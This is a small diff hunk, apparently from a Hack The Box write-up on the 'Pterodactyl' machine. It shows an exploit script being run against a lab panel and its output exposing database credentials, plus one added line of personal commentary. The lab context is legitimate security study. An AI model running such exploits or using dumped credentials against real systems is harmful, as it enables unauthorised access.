@@ -367,3 +367,5 @@ ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py http://panel.pterodactyl.htb
 http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
 ```
 
+it is already done : sad life
+
